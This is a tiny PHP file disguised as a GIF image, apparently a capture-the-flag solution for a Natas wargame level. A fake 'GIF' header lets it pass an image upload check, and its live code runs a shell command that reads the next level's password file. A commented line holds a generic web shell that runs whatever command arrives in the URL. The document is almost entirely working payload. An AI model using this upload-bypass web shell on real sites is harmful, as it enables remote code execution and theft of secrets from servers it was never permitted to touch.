GIF
<?php 
        /* though this didn't work out for some strange reasons
        ÿØÿà<? passthru($_GET["cmd"]); ?> 
        the GIF part is important since '\xFF\xD8\xFF\xE0' didn't do the hack
        */
        passthru("cat /etc/natas_webpass/natas14"); 
?>
